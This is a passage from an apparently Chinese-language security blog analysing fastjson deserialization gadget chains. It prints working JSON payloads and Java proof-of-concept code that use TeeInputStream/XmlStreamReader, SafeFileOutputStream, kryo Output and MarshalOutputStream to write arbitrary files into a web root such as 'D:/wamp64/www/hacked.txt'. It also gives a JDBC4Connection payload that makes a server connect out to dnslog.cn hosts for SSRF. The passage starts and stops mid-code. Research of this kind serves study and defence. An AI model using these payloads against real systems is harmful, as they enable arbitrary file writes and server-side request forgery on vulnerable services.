\&quot;$ref\&quot;:\&quot;$.input\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;branch\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;          \&quot;$ref\&quot;:\&quot;$.branch\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;closeBranch\&quot;: true\n&quot;</span> +<br>                <span class="hljs-string">&quot;      &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;httpContentType\&quot;:\&quot;text/xml\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;lenient\&quot;:false,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;defaultEncoding\&quot;:\&quot;UTF-8\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;trigger2\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.XmlStreamReader\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;is\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.TeeInputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;input\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;          \&quot;$ref\&quot;:\&quot;$.input\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;branch\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;          \&quot;$ref\&quot;:\&quot;$.branch\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;closeBranch\&quot;: true\n&quot;</span> +<br>                <span class="hljs-string">&quot;      &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;httpContentType\&quot;:\&quot;text/xml\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;lenient\&quot;:false,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;defaultEncoding\&quot;:\&quot;UTF-8\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;trigger3\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.XmlStreamReader\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;is\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.TeeInputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;input\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;          \&quot;$ref\&quot;:\&quot;$.input\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;branch\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;          \&quot;$ref\&quot;:\&quot;$.branch\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;closeBranch\&quot;: true\n&quot;</span> +<br>                <span class="hljs-string">&quot;      &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;httpContentType\&quot;:\&quot;text/xml\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;lenient\&quot;:false,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;defaultEncoding\&quot;:\&quot;UTF-8\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327162424018.png" alt="image-20250327162424018"></p><p>成功写入内容</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327171144065.png" alt="image-20250327171144065"></p><p><span style="color:#FF0000;">这里为什么要 &gt; 8192 呢？ 又是怎样导致的缓冲区溢出成功呢?</span></p><div class="note note-success" > 这其实就是 $ref 的机制，他告诉fastjson：不要在这里创建一个新对象。请使用之前在 JSON 中已经被创建并赋值给 'input' 键的那个对象。</br></br>第一个触发器 (trigger):执行完之后 TeeInputStream 读取了 4096 个字节，同时将这些 4096 字节写入了它的 branch中 此时，文件 尚未被写入任何内容。  </br></br>第二个触发器 (trigger): 通过 $ref 被设置为指向与第一个触发器完全相同的 ReaderInputStream 实例,而流（Stream）会保持它们的状态，知道前 4096 字节已经被读取了，会接着读取后边的字节同时写入branch，此时 branch就已经8192个字节了，已经满了。  </br></br>第三个触发器 (trigger): 使 brach的缓冲区溢出，触发写操作。   简而言之，就是利用多个触发器 (XmlStreamReader)，每个触发器都从一个共享的输入管道 (TeeInputStream) 读取一部分数据，迫使这个管道将数据倾倒入一个共享的输出缓冲区 (FileWriterWithEncoding)，直到该缓冲区溢出并将内容写入目标文件。</div><h4 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h4><p><strong>公开的POC</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/hacked.txt&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/test.txt&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;buffer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cHduZWQ=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;outputStream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.stream&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;close&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.writer&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这里 SerialOutput 的作用，和我们分析 MarshalOutputStream时，MarshalOutputStream 这个流的作用是一致的，本质上都是OutPutStream的子类，利用super(out) 去 调用write 所以个人感觉 sleepycat 这个包不如 jdk 原生的RMI 包通用 稍作修改</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/hacked.txt&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/test.txt&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;buffer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cHduZWQ=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;outputStream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.stream&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;close&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.writer&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;protocolVersion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这样也是可以执行写文件的</p><h5 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h5><p>主要 com.esotericsoftware.kryo.io.Output 这个类也具有写文件的能力，对应的依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;<br>    &lt;artifactId&gt;kryo&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>它提供了 setBuffer() 和 setOutputStream() 可以初始化buffer和缓冲区，主要是他的flush() 方法中有 write 操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBuffer</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] buffer)</span> &#123;<br>    <span class="hljs-built_in">this</span>.setBuffer(buffer, buffer.length);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOutputStream</span><span class="hljs-params">(OutputStream outputStream)</span> &#123;<br>    <span class="hljs-built_in">this</span>.outputStream = outputStream;<br>    <span class="hljs-built_in">this</span>.position = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">this</span>.total = <span class="hljs-number">0L</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">flush</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> KryoException &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.outputStream != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 利用我们传进来的outputStream执行write方法</span><br>            <span class="hljs-built_in">this</span>.outputStream.write(<span class="hljs-built_in">this</span>.buffer, <span class="hljs-number">0</span>, <span class="hljs-built_in">this</span>.position);<br>            <span class="hljs-built_in">this</span>.outputStream.flush();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KryoException</span>(ex);<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.total += (<span class="hljs-type">long</span>)<span class="hljs-built_in">this</span>.position;<br>        <span class="hljs-built_in">this</span>.position = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里flush可由write方法执行，所以还是用到了OutputStream的子类，初始化时调用 super(out) 和我们之前的分析如出一辙。</p><p>而SafeFileOutputStream 实际上就是封装一个文件的输出流，在执行write() 方法时，把字节流写入指定的文件，当然我们也可以使用上面提到的java.io.FileOutputStream 来进行替换 又得到了一种写文件的POC</p><h5 id="变种"><a href="#变种" class="headerlink" title="变种"></a>变种</h5><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> &#x27;java.io.FileOutputStream&#x27;<span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span> &#x27;D<span class="hljs-punctuation">:</span>/test.txt&#x27;<span class="hljs-punctuation">,</span><br>         <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span>     <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;buffer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cHduZWQ=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;outputStream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.stream&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;close&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.writer&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;protocolVersion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>其本质的执行原理都是一样的</p><h3 id="Mysql利用"><a href="#Mysql利用" class="headerlink" title="Mysql利用"></a>Mysql利用</h3><h4 id="JDBC4Connection"><a href="#JDBC4Connection" class="headerlink" title="JDBC4Connection"></a>JDBC4Connection</h4><p> Mysql connector 5.1.x 版本</p><p>JDBC4Connection其实是用来简化jdbc的开发流程的，之前需要Class.forName 获得驱动类，再去连接，用JDBC4Connection不再需要显示调用Class.forName，而且他会自动关闭连接，这就意味着它继承了AutoCloseable</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328095109480.png" alt="image-20250328095109480" style="zoom: 50%;" /><p>导入依赖看一下这个类的构造方法</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>看到它会调用super的构造方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328090448823.png" alt="image-20250328090448823"></p><p>super就是com.mysql.jdbc.ConnectionImpl ， 他的构造方法调用 createNewIO()</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328095356671.png" alt="image-20250328095356671"></p><p>createNewIO() 创建com.mysql.jdbc.MysqlIO，尝试建立连接</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328095622119.png" alt="image-20250328095622119"></p><p>看到最终调用了connect</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328095711175.png" alt="image-20250328095711175"></p><p>我们来看一个最简单的SSRF利用测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.mysql.jdbc.JDBC4Connection;<br><br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JDBCTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;gmgfoo.dnslog.cn&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">3306</span>;<br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">info</span>  <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        info.setProperty(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br>        info.setProperty(<span class="hljs-string">&quot;password&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br>        info.setProperty(<span class="hljs-string">&quot;NUM_HOSTS&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">JDBC4Connection</span> <span class="hljs-variable">jdbc4Connection</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JDBC4Connection</span>(host, port,<br>                    info,<span class="hljs-string">&quot;lingx5&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328101340284.png" alt="image-20250328101340284"></p><p>这就说明我们用 JDBC4Connection的构造方法 是可以发送请求的，而我们就可以用利用这一特性在fastjson中实现SSRF</p><h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;hostToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;kx97t6.dnslog.cn&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;portToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3306</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;root&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;root&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;NUM_HOSTS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;databaseToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;lingx5&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>JDBCssrf</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.poc;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JDBCssrf</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span 